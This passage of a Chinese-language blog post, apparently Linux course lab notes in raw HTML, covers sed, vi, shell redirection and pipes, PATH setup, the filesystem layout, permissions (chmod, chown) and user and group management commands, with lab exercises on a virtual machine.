class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token punctuation">[</span>-hnV<span class="token punctuation">]</span><span class="token punctuation">[</span>-e<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-f<span class="token operator">&lt;</span>script文件<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>文本文件<span class="token punctuation">]</span>-e<span class="token operator">&lt;</span>script<span class="token operator">></span>/--expression<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span> <span class="token comment"># 以选项中指定的script来处理输入的文本文件。</span>-f<span class="token operator">&lt;</span>script文件<span class="token operator">></span>/--file<span class="token operator">=</span><span class="token operator">&lt;</span>script文件<span class="token operator">></span> <span class="token comment"># 以选项中指定的script文件来处理输入的文本文件。</span>-n/--quiet/--silent <span class="token comment"># 仅显示script处理后的结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Shell-功能"><a href="#Shell-功能" class="headerlink" title="Shell 功能"></a>Shell 功能</h2><p>以 Bash Shell 为准</p><ol><li><p>历史命令记忆功能</p><p>前一次登录以前所执行过的 Shell 命令被保存在用户主目录下的 .bash_history 文件中</p></li><li><p>Tab键补全</p></li><li><p>文件名通配</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>*</td><td>匹配0个或多个字符</td></tr><tr><td>?</td><td>匹配任意一个字符</td></tr><tr><td>[list]</td><td>匹配 list 中的任意单一字符</td></tr><tr><td>[c1-c2]</td><td>匹配 c1-c2 中的任意单一字符</td></tr><tr><td>[!list]</td><td>匹配除 list 中的任意单一字符</td></tr><tr><td>{string1,string2,…}</td><td>匹配 string1 或 string2 （或更多）其一字符串</td></tr></tbody></table></li><li><p>命令别名 alias</p></li></ol><hr><h2 id="vi-命令行编辑文件"><a href="#vi-命令行编辑文件" class="headerlink" title="vi 命令行编辑文件"></a>vi 命令行编辑文件</h2><h3 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h3><p>命令模式 –&gt; 文本编辑模式：i、I、a、A、o、O</p><p>扩展命令模式：Esc 回到命令模式，输入<code>:</code>切换到扩展命令模式</p><p>退出vi：</p><ul><li><code>wq</code>保存文件，<code>wq newfile</code>或<code>w newfile</code>另存为新文件名</li><li><code>q!</code>不保存退出</li><li>在命令模式下输入<code>ZZ</code>，会保存当前文件的修改，并退出 vi 编辑器</li></ul><h3 id="vi-命令"><a href="#vi-命令" class="headerlink" title="vi 命令"></a>vi 命令</h3><p>命令模式下</p><ol><li><p>命令模式 –&gt; 文本编辑模式</p><p>i：从当前光标位置开始输入字符</p><p>I：光标移动到当前光标所在行的行首，开始输入字符</p><p>a：从当前光标后开始输入字符，也就是在当前光标所在的字符后开始插入新字符</p><p>A：光标移动到当前光标所在行的行尾，开始输入字符</p><p>o：在当前光标所在行之下新增一行</p><p>O：在当前光标所在行之上新增一行</p></li><li><p>光标移动命令</p><p>h：左移，如果在 h 前输入数字 n，则光标左移 n 个字符，下同</p><p>l：右移</p><p>j：上移</p><p>k：下移</p><p>0：移到行首</p><p>$：移到行尾</p><p>G：移动到文件的最后一行的行首</p><p>nG：移到第n行的行首</p><p>H：移到屏幕上显示的第一行</p><p>L：移到屏幕上显示的最后一行</p><p>M：移到屏幕的中间一行</p><p>w或W：右移至下一个单词的词首</p><p>e或E：移动到单词尾，若已处于当前的单词尾则移动到下一个单词尾</p><p>b或B：移动到词首，若已处于当前的单词首则移动到上一个单词首</p><br><p>此外，还有扩展模式命令</p><p><code>:n</code> ：光标移到文件的第n行</p><p><code>:$</code> ：光标移到文件的最后一行</p></li><li><p>替换删除命令</p><p>r：使用随后输入的字符替换当前光标所在的字符</p></li><li><p>剪切命令</p><p>d：剪切选定块到缓冲区</p></li><li><p>复制命令</p><p>y：复制选定块到缓冲区</p></li><li><p>粘贴命令</p><p>p：粘贴到当前光标后</p><p>P：粘贴到当前光标前</p></li><li><p>v 命令进入可视模式，用于选定区域</p></li><li><p>u 命令撤销前一次修改</p></li><li><p>查找命令</p><p>&#x2F;pattern：从光标开始处向后搜索 pattern 字符串</p><p>?pattern：从光标开始处向前搜索 pattern 字符串</p><p>n：在同方向重复上一次搜索命令</p><p>N：在反方向重复上一次搜索命令</p></li><li><p>扩展命令模式中——替换命令s</p><p><code>:s/p1/p2</code>：将当前行第一次出现的 p1 用 p2 替代</p><p><code>:s/p1/p2/g</code>：将当前行中所有 p1 均用 p2 替代</p></li></ol><hr><h2 id="扩展-Shell-命令"><a href="#扩展-Shell-命令" class="headerlink" title="扩展 Shell 命令"></a>扩展 Shell 命令</h2><h3 id="Shell-命令替换"><a href="#Shell-命令替换" class="headerlink" title="Shell 命令替换"></a>Shell 命令替换</h3><p>在Bash Shell中，反引号 &#96; 作为命令替换功能使用，具有内联执行的功能</p><p>于是就有了这样的用法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /lib/modules/<span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> <span class="token parameter variable">-r</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Shell-输入-x2F-输出的重定向与管道"><a href="#Shell-输入-x2F-输出的重定向与管道" class="headerlink" title="Shell 输入&#x2F;输出的重定向与管道"></a>Shell 输入&#x2F;输出的重定向与管道</h3><h4 id="标准输入-x2F-输出"><a href="#标准输入-x2F-输出" class="headerlink" title="标准输入&#x2F;输出"></a>标准输入&#x2F;输出</h4><p>在 Linux 系统中，每条 shell 命令对应的进程都有三个与之相关的输入&#x2F;输出流，对应特殊的文件描述指针：</p><ul><li>标准输入，文件描述指针为0：执行该进程时，进程获得用户从键盘输入的数据</li><li>标准输出，文件描述指针为1：命令执行后传回的正确信息</li><li>标准错误输出，文件描述指针为2：命令执行失败后传回的错误信息</li></ul><p>以 cat 命令为例，如果 cat 的命令行中没有参数，它就会从标准输入中读取数据，并将其送到标准输出，用户输入的每一行都立刻被 cat 命令输出到屏幕上，直到 ctrl+d 结束输入，cat 命令运行结束</p><h4 id="输入-x2F-输出重定向"><a href="#输入-x2F-输出重定向" class="headerlink" title="输入&#x2F;输出重定向"></a>输入&#x2F;输出重定向</h4><ul><li><p>输入重定向：把命令（或可执行程序）的标准输入重定向为从指定的文件获取输入数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令<span class="token operator">&lt;</span>文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用于不接受文件名作为输入参数的命令，要输入的内容又存在一个文件时</p><br></li><li><p>输出重定向：把命令（或可执行程序）的标准输出或标准错误输出重定向到指定文件中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令<span class="token operator">></span>文件名<span class="token operator"><span class="token file-descriptor important">1</span>></span> <span class="token comment">#stdout</span><span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token comment">#stderr</span>命令<span class="token operator">>></span>文件名 <span class="token comment">#追加到文件尾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br></li><li><p>Here Documents 输入重定向：将一对分隔符之间的正文重定向输入给命令</p><p>在<code>&lt;&lt;</code>操作符后面，任何字符都可以作为正文开始前的分隔符，Here 文档的正文一直延续到另一个分隔符为止，第二个分隔符应出现在新行的开头，即分隔符前面不能有空格，分隔符后面必须是回车符</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">command<span class="token operator">&lt;&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> limit_stringmsg_bodylimit_string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果使用<code>&lt;&lt;-</code>，则 msg_body 和 limit_string 行中的所有前缀 Tab 字符都将被忽略（但空格不会被忽略）</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216210643592.png" alt="image-20241216210643592"></p></li></ul><h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>将一个 shell 命令的输出结果传递给另一个 shell 命令作为输入时，可以使用 linux shell 提供的管道功能</p><p>使用管道符<code>|</code>来建立一个多条 shell 命令联合执行的命令</p><p>管道可以把一系列命令连接起来，第一个命令的输入会作为第二个命令的输入通过管道传给第二个命令</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216211314040.png" alt="image-20241216211314040"></p><hr><h2 id="Shell-变量"><a href="#Shell-变量" class="headerlink" title="Shell 变量"></a>Shell 变量</h2><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><ol><li><p>开启一个终端程序，执行命令<code>echo $PATH</code>，查看Linux环境变量PATH的值。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps45.jpg" alt="img"></p></li><li><p>新建目录“&#x2F;opt&#x2F;arm-linux&#x2F;bin”，在Shell终端中执行以下命令：</p><p><code>export PATH=$PATH:/opt/arm-linux/bin</code></p><p>执行完毕后检查PATH变量的值，是否有加入路径“&#x2F;opt&#x2F;arm-linux&#x2F;bin”，执行exit退出当前Shell，然后再次启动一个终端，查看PATH路径列表，是否有“&#x2F;opt&#x2F;arm-linux&#x2F;bin”</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps46.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps47.jpg" alt="img"></p></li><li><p>用全屏幕编辑工具vi编写一个文件setenv.sh，在setenv.sh写入能够为环境变量PATH新增路径“&#x2F;opt&#x2F;arm-linux&#x2F;bin”的命令：<br><code>export PATH=$PATH:/opt/arm-linux/bin</code></p><p>保存退出vi，然后执行“source setenv.sh”命令，执行完成后再次查看PATH 的结果，检查PATH变量设置效果；关闭当前终端，再次启动一个终端，检查PATH变量是否还有路径“&#x2F;opt&#x2F;arm-linux&#x2F;bin”。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps48.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps49.jpg" alt="img"></p></li><li><p>新建目录“&#x2F;opt&#x2F;bin”，使用全屏幕编辑工具vi修改系统环境配置文件中PATH变量设置，使得新修改后的PATH变量新增路径“&#x2F;opt&#x2F;bin”，要求修改后的PATH路径对每个用户都能生效。保存后注销当前用户登录，并使用root帐号重新登陆一次，再次开启终端并检查PATH变量的路径列表中是否有添加新的路径“&#x2F;opt&#x2F;bin”。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps50.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps51.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps52.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps53.jpg" alt="img"></p></li><li><p>把实验5的sdl-image-view.tar.gz中的可执行文件viewimage复制到&#x2F;opt&#x2F;bin，测试一下当&#x2F;opt&#x2F;bin目录添加到PATH路径后，能否在shell任意当前目录执行该程序</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps54.jpg" alt="img"></p></li></ol><hr><h1 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h1><h2 id="FHS-目录树"><a href="#FHS-目录树" class="headerlink" title="FHS 目录树"></a>FHS 目录树</h2><p>&#x2F;：根目录，通常以独立分区挂载</p><p>&#x2F;bin：命令行工具，不能单独挂载为一个分区</p><p>&#x2F;boot：linux启动文件，包括linux内核文件以及启动引导程序的配置文件</p><p>&#x2F;dev：设备与外设接口</p><p>&#x2F;etc：配置文件</p><p>&#x2F;home：存放所有普通用户主目录的目录</p><p>&#x2F;lib：系统函数库，不要以单独的分区挂载此目录</p><p>&#x2F;media：可移动设备的挂载点，如软驱、光驱和U盘</p><p>&#x2F;mnt：挂载某些额外设备</p><p>&#x2F;opt：放置非原 linux 发行版提供的第三方软件</p><p>&#x2F;root：root 主目录，需要与根分区处于同一目录</p><p>&#x2F;sbin：系统管理命令，不要以单独的分区挂载此目录</p><p>&#x2F;tmp：临时文件目录</p><p>&#x2F;usr：与 UNIX 操作系统软件资源相关的目录</p><p>&#x2F;var：与系统运行过程有关</p><hr><h2 id="文件与文件类型"><a href="#文件与文件类型" class="headerlink" title="文件与文件类型"></a>文件与文件类型</h2><p>“一切皆文件”</p><p>普通文件、目录文件</p><p>设备文件：系统把每个I&#x2F;O设备都看成一个文件，通常在 &#x2F;dev 下</p><p>链接文件：硬链接、软链接</p><p>管道文件：当两个进程需要进行数据与信息传递时，可以使用管道文件。写入的数据每次都添加到管道缓冲区的末尾，读数据的时候都是从缓冲区的头部读出数据的，管道文件通常建立在内存中</p><hr><h2 id="文件系统访问-Shell-命令"><a href="#文件系统访问-Shell-命令" class="headerlink" title="文件系统访问 Shell 命令"></a>文件系统访问 Shell 命令</h2><p>依旧记一些少用的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> 文件1 文件2 文件3 目录<span class="token function">mv</span> 文件1 文件2 文件3 目录<span class="token comment"># 复制/移动多个文件到目录</span><span class="token function">cp</span> <span class="token parameter variable">-r</span> 源目录 目标目录<span class="token comment"># 以递归形式复制整个目录的文件及其下级子目录</span><span class="token function">rm</span> -f/--force<span class="token comment"># 从不提示，直接删除</span><span class="token function">rm</span> <span class="token punctuation">[</span>-i/--interactive<span class="token punctuation">]</span><span class="token comment"># 交互式删除，等待用户确认，需要主动输入y进行确认</span><span class="token function">rm</span> -r/-R/--recursive<span class="token comment"># 将参数中列出的全部目录和子目录均递归删除</span><span class="token function">cat</span> <span class="token operator">></span> filename<span class="token comment"># 从键盘创建一个文件，结合输出重定向，ctrl+d结束输入</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>复制 &#x2F;etc&#x2F;fstab、&#x2F;etc&#x2F;inittab 文件到 &#x2F;root&#x2F;lab4&#x2F;bak&#x2F; 目录：</p><p>可用<code>cp /etc/fstab /etc/inittab /root/lab4/bak/</code></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps12.jpg" alt="img"></p><p>复制&#x2F;etc&#x2F;passwd文件到&#x2F;root&#x2F;lab4&#x2F;bak&#x2F;目录，并把该文件重命名为passwd.bk：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/10.jpg" alt="img"></p><p>使用<code>cat &gt; hello.txt</code>命令建立文件hello.txt，输入5行英文：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps11.jpg" alt="img"></p><p>执行<code>view /root/lab4/file/hello.txt</code>验证文件内容是否是前一步输入的内容：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/11.jpg" alt="img"></p><p>把&#x2F;root&#x2F;lab4&#x2F;file&#x2F;hello.txt文件复制到&#x2F;root&#x2F;lab4&#x2F;temp&#x2F;目录：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/12.jpg" alt="img"></p><p>删除非空目录&#x2F;root&#x2F;lab4&#x2F;aa：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps13.jpg" alt="img"></p><p>复制文件 &#x2F;root&#x2F;lab4&#x2F;file&#x2F;hello.txt 到 &#x2F;root&#x2F;lab4&#x2F;file&#x2F; 目录中并命名为hello-new.txt：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps14.jpg" alt="img"></p><hr><h2 id="从rpm包安装tree"><a href="#从rpm包安装tree" class="headerlink" title="从rpm包安装tree"></a>从rpm包安装tree</h2><p>把树形目录列表显示工具 tree 软件安装包文件 tree-1.5.3-2.el6.i686.rpm 通过 winscp 复制到 Linux 虚拟机，进入该 rpm 包所在的目录，执行 rpm 软件包安装命令<code>rpm -ivh tree-1.5.3-2.el6.i686.rpm</code>安装 tree 工具软件包</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps15.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps16.jpg" alt="img"></p><hr><h2 id="使用外部存储设备"><a href="#使用外部存储设备" class="headerlink" title="使用外部存储设备"></a>使用外部存储设备</h2><p>vmware 连接U盘到虚拟机中</p><p>mount 挂载</p><p>umount 卸载</p><p>设U盘安装的加载点为 &#x2F;media&#x2F;KINGSTON，识别为 &#x2F;dev&#x2F;sdb1</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">umount</span> /dev/sdb1<span class="token comment"># 或</span><span class="token function">umount</span> /media/KINGSTON<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /mnt/usbdisk<span class="token function">mount</span> <span class="token parameter variable">-t</span> vfat <span class="token parameter variable">-o</span> <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>utf8 /dev/sdb1 /mnt/usbdisk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="文件系统权限配置与管理"><a href="#文件系统权限配置与管理" class="headerlink" title="文件系统权限配置与管理"></a>文件系统权限配置与管理</h2><p>Linux 文件系统支持 UGO（User, Group, Other）访问控制机制</p><p>UGO 访问控制模型通过给linux系统中的文件赋予两个属性来起作用：所有者和访问权限</p><p>查看文件所有者与文件权限属性：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217003804957.png" alt="image-20241217003804957"></p><p>文件权限位：drwxr-xr-x文件拥有者：root文件所属组：4096</p><br><p>文件权限位示意图：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217003306623.png" alt="image-20241217003306623"></p><p>文件类型：&quot;-&quot;为普通文件，&quot;d&quot;为目录文件，&quot;i&quot;为连接文件，&quot;b”为块设备文件，&quot;c&quot;为字符设备文件</p><br><p>权限的数字表示形式：使用3位八进制的数字形式表示某个文件或目录实际配置的权限</p><p>如 rwx r-x r-x，其中转换进制：</p><p>rwx —— 111 —— 7（二进制转换为八进制）</p><p>r-x —— 101 —— 5</p><br><h3 id="文件权限设置"><a href="#文件权限设置" class="headerlink" title="文件权限设置"></a>文件权限设置</h3><p>权限修改命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token punctuation">[</span>who<span class="token punctuation">]</span> <span class="token punctuation">[</span>+ <span class="token operator">|</span> - <span class="token operator">|</span> <span class="token operator">=</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>mode<span class="token punctuation">]</span> <span class="token operator">&lt;</span>file_name<span class="token operator">></span>/<span class="token operator">&lt;</span>directory_name<span class="token operator">></span><span class="token parameter variable">-R</span> <span class="token comment"># 表示递归设置，即整个目录树都使用相同的权限配置</span><span class="token function">who</span> <span class="token comment"># 表示操作对象，有u（user）、g（group）、o（others）、a（all）可选</span>+ <span class="token comment"># 添加权限</span>- <span class="token comment"># 取消权限</span><span class="token operator">=</span> <span class="token comment"># 直接赋予给定的权限，取消所有以前设置的权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>文件拥有者修改命令：</p><p>root 用户可以直接修改文件拥有者</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token operator">&lt;</span>user_name<span class="token operator">></span> <span class="token operator">&lt;</span>directory_name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>文件所在组修改命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chgrp</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token operator">&lt;</span>group_name<span class="token operator">></span> <span class="token operator">&lt;</span>file_name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="Linux用户账号配置与管理"><a href="#Linux用户账号配置与管理" class="headerlink" title="Linux用户账号配置与管理"></a>Linux用户账号配置与管理</h1><h2 id="获取登录用户账号信息"><a href="#获取登录用户账号信息" class="headerlink" title="获取登录用户账号信息"></a>获取登录用户账号信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span><span class="token comment"># 查看用户账号信息，如用户UID、主组GID、用户所属组的信息</span><span class="token function">ps</span> <span class="token parameter variable">-l</span><span class="token comment"># 查看当前正在运行进程的详细信息，包括建立进程的UID、进程PID和创建该进程的父进程PPID</span><span class="token function">ls</span> <span class="token parameter variable">-ln</span><span class="token comment"># 查看文件系统中文件与目录的拥有者的UID与文件所处的组的GID信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>Linux 是多用户多任务操作系统，从本地或从远程登录的多个用户可以同时使用同一台运行 Linux 操作系统的计算机</p><p>Linux 系统内部使用用户ID（UID）来识别用户</p><p>在 Linux 系统中所有进行的工作都是以进程的方式进行的，运行的程序都体现为进程</p><p>用户账号分为三类：</p><ul><li>超级用户：root，UID为0，GID为0，最高权限</li><li>普通用户：只能管理自己启动的进程，只能操作其拥有权限的文件与目录，通常普通用户默认配置的UID值为500~60000</li><li>系统用户：伪用户，与系统服务相关，UID值为1~499</li></ul><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><p>具有相同特征或具有某种特定联系的用户的集合，用于表示该组内所有用户的账号称为组账号</p><p>Linux 系统中每个用户账号至少属于一个用户组；一个组中可以有多个用户，一个用户也可以属于多个不同的组；一个用户只能属于一个主组，但可以同时属于多个附加组</p><p>主组：用户登录 Linux 系统后的默认组，在 &#x2F;etc&#x2F;passwd 中的 GID 字段有记载，用户的主组可以切换，使用<code>newgrp 组名</code>，切换后原先的组变为附加组</p><p>用户组分类：</p><ul><li>标准组</li><li>系统组</li><li>私有组</li></ul><p>如要使多个用户能查看、修改某一文件或执行某个命令，可以先把这些用户都定义到同一用户组，然后修改文件或目录的权限，让改用户组具有相应的权限</p><h3 id="用户与用户组信息文件"><a href="#用户与用户组信息文件" class="headerlink" title="用户与用户组信息文件"></a>用户与用户组信息文件</h3><ul><li><p>用户账号信息 &#x2F;etc&#x2F;passwd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用户名:口令（该字段现已为x或*）:<span class="token environment constant">UID</span>:GID:注释性描述:主目录:登录shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216215628084.png" alt="image-20241216215628084"></p></li><li><p>用户密码信息及其密码时限文件 &#x2F;etc&#x2F;shadow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用户名:加密口令:口令最后修改时间:口令最小有效天数:口令最大有效天数:警告时间:不活动时间:账号过期失效时间:标志<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216215831695.png" alt="image-20241216215831695"></p></li><li><p>用户组信息文件 &#x2F;etc&#x2F;group</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">组名:口令:GID:组内成员列表<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216220053865.png" alt="image-20241216220053865"></p></li><li><p>用户组密码文件 &#x2F;etc&#x2F;gshadow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">组名:口令:组管理者:组成员<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216220302442.png" alt="image-20241216220302442"></p></li></ul><hr><h2 id="建立用户和用户组账号"><a href="#建立用户和用户组账号" class="headerlink" title="建立用户和用户组账号"></a>建立用户和用户组账号</h2><p>建立用户组</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupadd</span> 选项 用户组名<span class="token function">groupadd</span> <span class="token parameter variable">-g</span> GID 用户组名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>建立用户账号并设定登录密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> 选项 用户名<span class="token parameter variable">-u</span> <span class="token environment constant">UID</span> <span class="token comment"># 指定用户账号对应的UID</span><span class="token parameter variable">-g</span> 组名 <span class="token comment"># 指定用户账号的初始默认组</span><span class="token parameter variable">-G</span> 组名1，组名2，组名3，<span class="token punctuation">..</span>. <span class="token comment"># 指定用户所属的附加组</span><span class="token parameter variable">-m</span> <span class="token comment"># 创建用户主目录</span><span class="token parameter variable">-M</span> <span class="token comment"># 不建立用户主目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">passwd</span> 选项 用户名<span class="token parameter variable">--stdin</span> <span class="token comment"># 从标准输入读取令牌</span><span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token parameter variable">--stdin</span> 用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>设定组密码与管理组成员</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gpasswd <span class="token punctuation">[</span>-a user<span class="token punctuation">]</span> <span class="token punctuation">[</span>-d user<span class="token punctuation">]</span><span class="token punctuation">[</span>-A user,<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-M user,<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-r<span class="token punctuation">]</span><span class="token punctuation">[</span>-R<span class="token punctuation">]</span> groupname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改用户账号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">usermod</span> 选项 用户名<span class="token function">usermod</span> <span class="token parameter variable">-m</span> <span class="token parameter variable">-d</span> /home/new-dir user1<span class="token comment"># 修改用户user1的主目录为/home/new-dir，把原来用户的主目录迁移到新目录中</span><span class="token function">usermod</span> <span class="token parameter variable">-l</span> new-username user1<span class="token comment"># 修改用户user1的用户名为new-username</span><span class="token parameter variable">-g</span> 组名 <span class="token comment"># 修改用户账号的初始默认组（主组）</span><span class="token parameter variable">-G</span> 组名1 组名2 组名3 <span class="token comment"># 修改用户所属的附加组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改用户组信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupmod</span> 选项 用户组<span class="token function">groupmod</span> <span class="token parameter variable">-g</span> <span class="token number">600</span> group2<span class="token comment"># 将组group2的组标识号修改为600</span><span class="token function">groupmod</span> <span class="token parameter variable">-g</span> <span class="token number">10000</span> <span class="token parameter variable">-n</span> group3 group2<span class="token comment"># 将组group2的标识号改为10000，组名修改为group3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除用户、删除组</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupdel</span> 用户组<span class="token function">userdel</span> <span class="token parameter variable">-r</span> 用户名<span class="token comment"># -r删除用户时也删除用户相关的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p>建立标准组:account （gid&#x3D;1200）、admin   (gid&#x3D;1000)、sale  (gid&#x3D;1100)</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/1.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/2.jpg" alt="img"></p><p>建立一个主组属于admin的帐号 admin-user1，其uid为1001<br>建立一个附加组属于admin的帐号 admin-user2，其uid为1002<br>建立一个主组属于sale的帐号 sale-user1，其uid为1101<br>建立一个附加组属于sale的帐号 sale-user2，其uid为1102<br>建立一个主组属于account的帐号 account-user1，其uid为1201<br>建立一个附加组属于account的帐号 account-user2，其uid为1202<br>建立一个主组属于admin，附加组属于sale、account的用户帐号 admin-all，uid为1000<br>建立完用户后 ，给这些用户设定初始密码&quot;123456&quot;</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/3.jpg" alt="img"></p><p>建立两个新组 fjnumcs、fjnu</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/4.jpg" alt="img"></p><p>建立用户 jack、lucy，并把其主组设置为 fjnumcs，附加组设置为 fjnu</p><p><img 